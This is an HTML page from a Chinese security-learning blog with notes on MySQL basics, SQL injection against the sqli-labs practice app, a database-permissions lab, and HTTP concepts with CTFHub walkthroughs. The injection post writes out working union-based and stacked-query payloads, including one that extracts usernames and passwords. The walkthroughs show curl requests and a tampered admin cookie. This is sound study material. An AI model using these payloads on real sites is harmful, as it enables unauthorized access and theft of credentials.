<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"-181.github.io","root":"/","scheme":"Pisces","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="左">
<meta property="og:url" content="https://-181.github.io/index.html">
<meta property="og:site_name" content="左">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="左">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://-181.github.io/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>左</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">左</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">春有百花秋有月， 夏有凉风冬有雪</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="左"
      src="/image/avatar.jpg">
  <p class="site-author-name" itemprop="name">左</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">
      

      
    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/07/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-title-link" itemprop="url">mysql数据库</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-07-23 22:54:59 / 修改时间：22:55:00" itemprop="dateCreated datePublished" datetime="2021-07-23T22:54:59+08:00">2021-07-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>数据库：存放数据的仓库</p>
<p>客户端访问-&gt;web服务器-&gt;数据库服务器</p>
<p>SQL是一种数据库查询和程序设计语言。</p>
<p>搭建MySQL环境：下载phpstudy</p>
<p>MySQL数据库结构：</p>
<p>数据库包含表，表由列组成，表的存储方式是按行存储</p>
<p>2.用/g结尾，或者什么都不用也可以</p>
<p>3.语句比较长时，关键字一行，下一行写要查询的东西，再下一行关键字，再一行表名，整条语句写完再写分号</p>
<p>``着重号，区分说明不是关键字，只是字段</p>
<p>SQL语句</p>
<p>增删改查</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">show database;</span><br><span class="line"></span><br><span class="line">查询：select *&#x2F;列名 from 表名</span><br><span class="line">     select *&#x2F;列名 from 表名 where 列 运算符 值（eg:id&#x3D;178）</span><br><span class="line">向表中插入行：insert into 表名 values 值1，值2</span><br><span class="line">修改：update 表名</span><br><span class="line">删除行:delete from 表名 where 列名&#x3D;值</span><br><span class="line">      delete * from 表名</span><br><span class="line">排序：order by</span><br><span class="line">SQL利用这个语句来判断列数及显示位</span><br></pre></td></tr></table></figure>

<p>and：两个条件都成立，则显示一条记录</p>
<p>or：   只要有一个条件，则显示一条记录</p>
<p>select id,username from user where id=178 and username = ‘zuo’ ;</p>
<p>limit控制输出：</p>
<p>联合查询</p>
<p>从0开始计算</p>
<p>select id,username from user limit 0,1;</p>
<p>从第一行开始，获取1条数据</p>
<p>select id,username from user limit 2,4;</p>
<p>从第三行开始，获取2条数据</p>
<p>注释符</p>
<p>函数：</p>
<p>从1开始计算</p>
<p>length(‘name’):  函数返回字符串长度</p>
<p>select length(‘zuo’);</p>
<p>substr(‘name’,1,1)：截取字符串</p>
<p>select substr(‘zuo’,1,2);</p>
<p>从第一个字符开始，获取2个字符</p>
<p>ascii(‘a’)：返回ascii码</p>
<p>select ascii(‘zuo’);</p>
<p>left(name, 2)：返回name的左边2个字符</p>
<p>right(name, 2)：返回name的右边2个字符</p>
<p>‘’ 字符串</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/07/20/SQL%E6%B3%A8%E5%85%A5./">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/20/SQL%E6%B3%A8%E5%85%A5./" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-07-20 22:49:27" itemprop="dateCreated datePublished" datetime="2021-07-20T22:49:27+08:00">2021-07-20</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-07-23 22:54:24" itemprop="dateModified" datetime="2021-07-23T22:54:24+08:00">2021-07-23</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="SQL注入之联合"><a href="#SQL注入之联合" class="headerlink" title="SQL注入之联合"></a>SQL注入之联合</h2><p>schemata表：show databases的结果取自于此表</p>
<p>tables表</p>
<p>columns表</p>
<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>攻击者提交查询请求到web服务器</p>
<p>危害：</p>
<p>获取敏感数据：获取网站管理员账号密码等</p>
<p>使用万能密码登录网站后台等</p>
<p>列目录，读取、写入文件等</p>
<p>读取、写入、删除注册表</p>
<p>1.判断是否存在sql注入</p>
<p>报错注入、回显注入：<code>&#39;</code>单引号</p>
<p>3.获取字段数</p>
<p>4.获取显示位</p>
<p>Audi-1/sqli-labs: SQLI labs to test error based, Blind boolean based, Time based. (github.com)</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
<p>单引号报错。双引号不会报错</p>
<p>?id=1</p>
<p>即select * from user where id=1</p>
<p>?id=1’</p>
<p>即select * from user where id=‘1’</p>
<p>字符型需要单引号闭合</p>
<p>order by 3：将3个字段排序，若字段数只有2个，则会报错</p>
<p>联合查询：</p>
<p>select * from user where id=‘1’ union select 1,2,3;    （3个字段数）</p>
<p>?id=1’ union select 1,2,3</p>
<p>查询的字段数需与前面一致</p>
<p>select database()：查看数据库名</p>
<p>select user()：</p>
<p>?id=-1’ union select 1,group_concat(schema_name), 3 from information_schema.schemata –+</p>
<p>查询所有数据库名</p>
<p>group_concat</p>
<p>concat</p>
<p>查询所有数据库表</p>
<p>?id=-1’ union select 1,group_concat(schema_name), 3 from information_schema.tables where table_schema=database() –+</p>
<p>从emails表查询数据：</p>
<p>?id=-1’ union select 1,username,password from emails limit 0,1 –+</p>
<p>数据库-&gt;表-&gt;字段-&gt;字段内容（数据)</p>
<p>?id=-1：数据库中没有这条记录，所以会显示注入位 </p>
<p>id=1 and 1=1</p>
<p>id=1 and 1=2：为假，查询不到结果</p>
<h3 id="sql注入之堆叠"><a href="#sql注入之堆叠" class="headerlink" title="sql注入之堆叠"></a>sql注入之堆叠</h3><p>以<code>;</code>为分隔符，同时执行多个sql语句</p>
<p>mysqli_multi_query()函数：执行一个或多个语句</p>
<p>select * from user where id=-1’ ;select </p>
<p>id=-1’; insert into users(id) values (66) –+</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>ascii码占1个字符，gbk占2个字符，通过恶意构造字符占用ascii码</p>
<h3 id="sql注入之报错"><a href="#sql注入之报错" class="headerlink" title="sql注入之报错"></a>sql注入之报错</h3><p>通过报错函数获取信息，前提是后台没有屏蔽报错信息</p>
<p>常用报错函数：</p>
<p>updataxml()、extractvalue()、floor()</p>
<p>xpath</p>
<p>超过32位，页面无法显示</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/07/20/MySQL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/20/MySQL/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-07-20 22:48:26" itemprop="dateCreated datePublished" datetime="2021-07-20T22:48:26+08:00">2021-07-20</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>MySQL</p>
<p>实验内容与步骤</p>
<p>本实验主要是通过设置数据库的用户权限来保证数据库的安全，具体实验步骤如下：</p>
<p><strong>数据库安全实验</strong></p>
<p>1、启动MySQL</p>
<p>2、MySQL密码为安装时所设，键入后回车，界面如下。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=9fa62840-a352-456d-8d69-caa2d273d53a.png" alt="img"></p>
<p>3、运行下图命令，查看User表。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=186daf57-25d3-4381-9a20-1650b86c9475.png" alt="img"></p>
<p>4、运行update命令，将MySQL数据库root用户的口令改成123456。其中最后一句命令flush privileges的意思是强制刷新内存授权表，否则用的还是缓冲中的口令，这时非法用户还可以用root用户及空口令登录，直到重启MySQL服务器。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=0ad3bd00-1505-4c0a-8928-25bc0a3b257a.png" alt="img"></p>
<p>5、运行delete命令，删除空用户。Host字段为localhost的匿名用户拥有所有的权限，就是说本地用户用空的用户名和空的口令登录MySQL数据库服务器可以得到最高的权限，所以匿名用户必须删除。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=bad75193-09ae-4757-894a-d0fea4c15774.png" alt="img"></p>
<p>6、Desc User</p>
<p>User表是授权表中最重要的一个，运行下图命令，列出可以连接服务器的用户及其加密口令，并且它指定它们有哪种全局（超级用户）权限。在User表启用的任何权限均是全局权限，并适用于所有数据库。所以我们不能给任何用户访问MySQL. User表的权限。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=8290494b-7232-4c8d-9bf0-e5e0238e22bc.png" alt="img"></p>
<p>7、Desc DB</p>
<p>运行下图命令，查看DB表，列出所有数据库，而用户有权限访问它们。在这里指定的权限适用于一个数据库中的所有表。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=98451506-5c78-4469-b41f-dc5035c1141a.png" alt="img"></p>
<p>8、Desc Host</p>
<p>Host表如下图所示，与DB表结合使用在一个较好层次上控制特定主机对数据库的访问权限，这可能比单独使用DB好些。这个表不受GRANT和REVOKE语句的影响。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=9643dad3-6421-4086-b2d1-bdaea9989c48.png" alt="img"></p>
<p>9、设置用户权限</p>
<p>如下图命令用于在本地增加一个具有所有权限的test 用户(超级用户)，密码是test。ON子句中的*.*意味着“所有数据库、所有表”。with grant option表示它具有grant权限。用grant语句创建权限是不需要再手工刷新授权表的，因为它已经自动刷新了。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=751d341b-26be-4686-bdc2-b5f42ece14a6.png" alt="img"></p>
<p>查看运行结果，如下图。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=21bfb44d-fe08-404c-9d2e-32a9d8a2d8a3.png" alt="img"></p>
<p>10、删除用户的权限，并删除用户</p>
<p>删除用户权限。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=7c1e474a-0b9d-4c99-a206-7bd5da081978.png" alt="img"></p>
<p>删除用户test。</p>
<p><img src="https://www.hetianlab.com/headImg.action?guideImg=5465c5d7-a6ad-44c1-ad39-d5fd7c3da6f2.png" alt="img"></p>
<p>实验报告要求</p>
<p>对实验结果进行分析，完成思考题目，总结实验的心得体会，并提出实验的改进意见。</p>
<p>分析与思考</p>
<p>1、简要介绍一下存储于DBMS中数据的三个安全特性。</p>
<p>2、数据库防范各种外部安全攻击的能力包括哪些。</p>
<p>3、数据库安全目标是什么？</p>
<p>4、视图机制有哪些优点？</p>
<p>5、什么是数据库中的自主存取控制方法和强制存取控制方法？</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/07/19/HTTP%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%99%BD%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/19/HTTP%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%99%BD%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">HTTP协议小白入门</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-07-19 00:00:00 / 修改时间：19:15:48" itemprop="dateCreated datePublished" datetime="2021-07-19T00:00:00+08:00">2021-07-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="HTTP请求方式"><a href="#HTTP请求方式" class="headerlink" title="HTTP请求方式"></a>HTTP请求方式</h3><p>HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作），来以不同方式操作指定的资源。</p>
<p>GET、POST、OPTIONS、HEAD、PUT、DELETE、TRACE、CONNECT </p>
<h4 id="GET与POST："><a href="#GET与POST：" class="headerlink" title="GET与POST："></a>GET与POST：</h4><p>　<strong>GET方法</strong>提交的数据会直接填充在请求报文的URL上，如<code>https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1</code> .  <code>?</code>问号划分域名和get提交的参数，A=B中的A是参数名，B是参数值，多个参数之间用&amp;进行分割，如果参数值是中文，则会转换成诸如%ab%12加密16进制码。一般来说，浏览器处理的URL最大限度长度为1024B（不同浏览器不一样），所以GET方法提交参数长度有限制。</p>
<p>​    <strong>POST方法</strong>提交的数据会附在正文上，一般请求正文的长度是没有限制的，但表单中所能处理的长度一般为100k（不同协议不同浏览器不一样）,而且需要考虑下层报文的传输效率，不推荐过长。</p>
<p>​    所以GET方法可以用来传输一些可以公开的参数信息，解析也比较方便，如百度的搜索的关键词，而POST方法可以用来提交一个用户的敏感信息（如果不使用HTTPS加密，报文正文仍旧是明文，容易被人截获读取）</p>
<h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><p>HTTP状态码以三位数标识，分为五类</p>
<p><strong>状态码分类表</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>类别</th>
<th>原因短语</th>
</tr>
</thead>
<tbody><tr>
<td>1xx</td>
<td>Informational（信息性状态码）</td>
<td>接受的请求正在处理</td>
</tr>
<tr>
<td>2xx</td>
<td>Success（成功状态码）</td>
<td>请求正常处理完毕</td>
</tr>
<tr>
<td>3xx</td>
<td>Redirection（重定向）</td>
<td>需要进行附加操作以完成请求</td>
</tr>
<tr>
<td>4xx</td>
<td>Client error（客户端错误）</td>
<td>客户端请求出错，服务器无法处理请求</td>
</tr>
<tr>
<td>5xx</td>
<td>Server Error（服务器错误）</td>
<td>服务器处理请求出错</td>
</tr>
</tbody></table>
<h4 id="302状态码"><a href="#302状态码" class="headerlink" title="302状态码"></a>302状态码</h4><p><strong>HTTP临时重定向</strong></p>
<p>应用的典型场景是服务器页面路径的重新规划</p>
<ul>
<li>比如一个portal页面，换了新的域名，但是老的域名地址还有很多用户在使用，这样可以对老域名配置302跳转到新域名地址，保证服务的延续。</li>
</ul>
<p><strong>301和302</strong>重定向：</p>
<p>301表示这个网页已经永久的由服务器的A路径下移动到路径B下；</p>
<p>而302表示临时移动到B路径下，对应到Url地址也即<a target="_blank" rel="noopener" href="http://baidu.com/file/A/1.html%E5%88%B0http://baidu.com/file/B/1.html%EF%BC%8C%E5%BD%93%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E5%89%8D%E4%B8%80%E4%B8%AA%E5%9C%B0%E5%9D%80%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E5%91%8A%E7%9F%A5%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%8C%E5%88%B0B%E8%B7%AF%E5%BE%84%E4%B8%8B%E8%8E%B7%E5%8F%96%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E9%9A%8F%E5%90%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E9%87%8D%E6%96%B0%E5%8F%91%E8%B5%B7%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%EF%BC%8C%E8%AF%B7%E6%B1%82B%E8%B7%AF%E5%BE%84%E4%B8%8B%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%BB%8F%E8%BF%87%E6%B8%B2%E6%9F%93%EF%BC%8C%E5%91%88%E7%8E%B0%E7%BB%99%E7%94%A8%E6%88%B7%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%B7%98%E5%AE%9D%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%8C%E8%AF%B7%E6%B1%82taobao.com%EF%BC%8C%E6%94%B6%E5%88%B0302%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%8D%E6%AC%A1%E8%AF%B7%E6%B1%82www.taobao.com%E8%8E%B7%E5%BE%97%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9%E3%80%82">http://baidu.com/file/A/1.html到http://baidu.com/file/B/1.html，当浏览器访问前一个地址的时候，服务器会告知浏览器，到B路径下获取这个文件，随后浏览器重新发起网络请求，请求B路径下的页面，经过渲染，呈现给用户，例如淘宝的例子，请求taobao.com，收到302，从而浏览器再次请求www.taobao.com获得页面内容。</a></p>
<h4 id="401状态码"><a href="#401状态码" class="headerlink" title="401状态码"></a>401状态码</h4><p>请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。</p>
<h3 id="Cookie欺骗"><a href="#Cookie欺骗" class="headerlink" title="Cookie欺骗"></a>Cookie欺骗</h3><p>Cookie，有时也用复数形式 Cookies。</p>
<p>cookie机制是在浏览网页的时候，服务器将你的登录信息，浏览信息等发送给客户端并保存一定时间。下一次访问这个网站的时候，就能读取上一次的记录。</p>
<p>例如自动登录等。很多的网站都是由cookie来辨认登录者的信息。它可以起到登录验证的作用，却也因此存在了漏洞，可以绕过验证直接登录到后台。</p>
<h3 id="HTTP基本认证-Basic-Authentication"><a href="#HTTP基本认证-Basic-Authentication" class="headerlink" title="HTTP基本认证(Basic Authentication)"></a>HTTP基本认证(Basic Authentication)</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>桌面应用程序通过HTTP协议跟Web服务器交互， 一般不使用cookie, 而是把  “<strong>用户名+冒号+密码</strong>“用BASE64编码后的字符串放在http request 中的header Authorization中发送给服务端，  这种方式叫HTTP基本认证。</p>
<p>浏览器弹出一个需要输入用户名和密码的<strong>登录框</strong>，就是使用HTTP基本认证。</p>
<p>http协议是无状态的， 同一个客户端对服务器的每个请求都要求认证。 </p>
<h4 id="HTTP基本认证过程"><a href="#HTTP基本认证过程" class="headerlink" title="HTTP基本认证过程"></a>HTTP基本认证过程</h4><ol>
<li><p>客户端发送http request 给服务器</p>
</li>
<li><p>由于request中没有包含Authorization header, 服务器会返回401 Unauthozied 给客户端，并且在Response 的 header “WWW-Authenticate” 中添加信息。</p>
</li>
<li><p>浏览器接受到401 Unauthozied之后，弹出登录框。用户输入用户名和密码后， 客户端把用户名和密码base64编码，放在Authorization header中发送给服务器。</p>
</li>
<li><p>服务器将Authorization header中的用户名密码取出，进行验证。若验证通过，会根据请求，发送资源给客户端。</p>
</li>
</ol>
<p>request第一次传到服务器时，服务器没有认证的信息，会返回401 Unauthozied给客户端。认证之后将认证信息放在session，以后在session有效期内就不用再认证了。</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>通过做题以加深对HTTP协议的理解</p>
<h3 id="CTFHub-HTTP协议-请求方式"><a href="#CTFHub-HTTP协议-请求方式" class="headerlink" title="[CTFHub]  HTTP协议  请求方式"></a>[CTFHub]  HTTP协议  请求方式</h3><p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E9%A2%98%E7%9B%AE%E3%80%82..png"></p>
<p><strong>HTTP请求方式可以自定义，并且区分大小写</strong></p>
<p>题目提示HTTP的方法是GET，使用CTF**B 方法，就能得到flag</p>
<p>关键字猜测为CTFHUB</p>
<h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><p> 在BURP里面通过更改请求方式为CTFHUB得到flag</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/burp.png"></p>
<h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>直接用 CTFHUB 方法请求 index.php 即可拿到 flag。</p>
<p>使用cmd命令行，输入curl命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X CTFHUB challenge-d58aa9426ac181c9.sandbox.ctfhub.com:10800&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/cmd.png"></p>
<h3 id="CTFHub-HTTP协议-302跳转"><a href="#CTFHub-HTTP协议-302跳转" class="headerlink" title="[CTFHub]  HTTP协议  302跳转"></a>[CTFHub]  HTTP协议  302跳转</h3><p>点击超链接, 没有反应。</p>
<p>检查元素，发现链接到了另一个页面.</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/2index.png"></p>
<p>检查Network，<code>index.php</code>的HTTP状态码为302</p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/2">https://gitee.com/chen-lishan/tuc/raw/master/2</a> 302.png)</p>
<p>因此，要用<code>index.php</code>,  而非<code>index.html</code></p>
<h4 id="法一：-1"><a href="#法一：-1" class="headerlink" title="法一："></a>法一：</h4><p>burp抓包</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/2burp.png"></p>
<h4 id="法二：-1"><a href="#法二：-1" class="headerlink" title="法二："></a>法二：</h4><p>使用cmd命令行，输入curl命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http:&#x2F;&#x2F;challenge-fbe7b71b1bf4988a.sandbox.ctfhub.com:10800&#x2F;index.php</span><br></pre></td></tr></table></figure>







<h3 id="CTFHub-HTTP协议-Cookie"><a href="#CTFHub-HTTP协议-Cookie" class="headerlink" title="[CTFHub] HTTP协议   Cookie"></a>[CTFHub] HTTP协议   Cookie</h3><p><img src="https://gitee.com/chen-lishan/tuc/raw/master/3%E9%A2%98%E7%9B%AE.png"></p>
<p>题目提示，需要利用admin获得flag</p>
<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>Burpsuite监听抓包，将admin的值由0改为1，返回请求数据包即可</p>
